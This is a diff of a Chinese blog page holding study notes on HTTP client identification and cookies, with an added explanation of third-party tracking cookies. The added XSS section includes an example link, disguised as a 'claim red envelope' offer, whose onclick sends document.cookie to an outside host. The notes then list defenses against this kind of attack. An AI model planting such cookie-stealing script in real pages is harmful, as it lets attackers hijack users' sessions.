@@ -15,7 +15,7 @@
 <meta property="og:description" content="不可靠的识别，一般爬虫可能使用:Http 首部: From、User-Agent、Referer 客户端IP地址: IP 地址会变化 通过网络地址转换(Network Address Transition NAT)可以隐藏真实的 IP 地址 经过代理或网关转发的新连接，导致服务器只看到代理的IP地址 (有些代理会添加扩展的         Client-IP\X-Forwarded-For 首部)">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-06-10T02:02:23.000Z">
-<meta property="article:modified_time" content="2020-06-12T04:00:27.178Z">
+<meta property="article:modified_time" content="2020-07-03T09:19:03.977Z">
 <meta property="article:author" content="Zhang qijie">
 <meta name="twitter:card" content="summary">
   
@@ -125,20 +125,20 @@
 <li>表单嵌入同步令牌（一个随机唯一的 token）</li>
 </ol>
 <ul>
-<li>XSS (Cross-site scripting  XSS) 跨站脚本<br>跨站脚本是代码注入的一种<br><strong><em>攻击手段和目的</em></strong> : 获取 cookie，获取本地存储的用户敏感信息，其他操作<br><strong><em>防御措施</em></strong> :<ol>
-<li>过滤特殊字符<br>客户端和服务器端都对增加正则校验，没有通过校验则客户端不允许提交，服务器端不允许入库</li>
+<li>XSS (Cross-site scripting  XSS) 跨站脚本<br>跨站脚本是代码注入的一种<br>注入下面这个代码可以获取到 cookie 并发送到 恶意网站<br>&lt;a href=”#” onclick=<code>window.location=http://abc.com?cookie=${docuemnt.cookie}</code>&gt;领取红包</a><br><strong><em>攻击手段和目的</em></strong> : 获取 cookie，获取本地存储的用户敏感信息，其他操作<br><strong><em>防御措施</em></strong> :<ol>
+<li>过滤特殊字符<br>客户端和服务器端都对输入增加正则校验，没有通过校验则客户端不允许提交，服务器端不允许入库</li>
 <li>数据转义<br>前端把需要展示到页面的数据转义，比如直接 replace script 标签，遇到 “&lt;” 或 “&gt;” 添加 “\” 转义处理</li>
 <li>设置 http-only 属性<br>cookie 有一个 http-only 属性，表示 cookie 只能被 http 请求携带，不能通过 document.cookie 获取</li>
 </ol>
 </li>
 </ul>
 <p><strong><em>cookie 会导致频繁发送 首部体积庞大 的请求</em></strong></p>
-<p>构建用户跟踪: 将持久 cookie 与 IP 地址、Referer 结合可以构建相当精确的用户档案和浏览模式信息</p>
+<p>构建用户跟踪: 将持久 cookie 与 IP 地址、Referer 结合可以构建相当精确的用户档案和浏览模式信息<br><strong>第三方 cookie</strong> :<br>通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。<br>举个例子，用户正在访问的的正规网站的域名为 A，广告商的域名为 B。那么即使用户浏览器地址栏显示为A，但实际上浏览器做了两次请求，一次给 A 为了显示正常内容，一次给 B 为了显示广告内容。这样的话 A 和 B 实际上都可以通过浏览器使用 cookies。区别在于，A 的 cookie 值只属于A，B 的 cookie 值只属于 B。下次用户在进入网站 C 里面如果还有 B 的<iframe> 广告，那么 B 就可以通过之前在 A 网站上做的记录，给用户精准投放广告。至于 B是怎么知道用户在A上看过什么，那就是 A 和 B 之间的事了。亦或者 B 本身就是一个比较流行的网站，例如百度或者淘宝，它自己就可以记录用户习惯，然后再投到它的其他广告里。这就是为什么你在淘宝进行了搜索，然后再新浪微博页面上居然能看到该搜索有关的广告。这就是因为新浪微博的页面上有一个 <iframe> 显示了淘宝的广告。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://fuqiao2017.github.io/2020/06/10/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%86%E5%88%AB%E4%B8%8ECookie%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/" data-id="ckc32phd4000946rp0gp62sch" class="article-share-link">Share</a>
+      <a data-url="https://fuqiao2017.github.io/2020/06/10/Http-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%86%E5%88%AB%E4%B8%8ECookie%E6%9C%BA%E5%88%B6-%E7%AC%94%E8%AE%B0/" data-id="ckccxgz9e0006qprp018f6lim" class="article-share-link">Share</a>
       
       
     </footer>
@@ -196,6 +196,14 @@
       <ul>
         
           <li>
+            <a href="/2020/07/07/%E7%AE%97%E6%B3%95-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8E%92%E5%BA%8F-%E7%AC%94%E8%AE%B0/">算法 第二章 排序 笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%BA%94%E7%94%A8%E5%B1%82-%E7%AC%94%E8%AE%B0/">计算机网络 第六章 应用层 笔记</a>
+          </li>
+        
+          <li>
             <a href="/2020/07/01/Vue-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Vue 学习笔记</a>
           </li>
         
@@ -205,14 +213,6 @@
         
           <li>
             <a href="/2020/06/24/%E7%AE%97%E6%B3%95-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%9F%BA%E7%A1%80-%E7%AC%94%E8%AE%B0/">算法 第一章 基础 笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2020/06/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E8%BF%90%E8%BE%93%E5%B1%82-%E7%AC%94%E8%AE%B0/">计算机网络 第五章 运输层 笔记</a>
-          </li>
-        
-          <li>
-            <a href="/2020/06/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%B1%82-%E7%AC%94%E8%AE%B0/">计算机网络 第四章 网络层 笔记</a>
           </li>
         
       </ul>
